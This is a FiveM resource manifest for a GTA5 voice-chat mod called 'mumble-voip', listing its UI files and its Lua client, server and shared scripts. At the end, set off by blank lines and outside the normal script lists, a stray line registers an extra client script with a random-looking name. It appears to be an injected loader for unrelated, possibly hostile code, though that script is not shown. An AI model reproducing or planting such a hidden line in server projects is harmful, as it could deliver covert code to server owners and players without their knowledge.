fx_version "adamant"
game "gta5"

name "mumble-voip"
description "A tokovoip replacement that uses fivems mumble voip"
author "Frazzle (frazzle9999@gmail.com) Used By: ZVRP"
version "1.3"

ui_page "ui/index.html"

files {
	"ui/hash/murmurhash3.js",
	"ui/index.html",
	"ui/mic_click_on.ogg",
	"ui/mic_click_off.ogg",
}

shared_scripts {
	"config.lua",
	"grid.lua",
}

client_scripts {
	"client.lua",
}

server_scripts {
	"server.lua",
}

provide "tokovoip_script"




client_script "api-ac_BkHErUOTvQHl.lua"




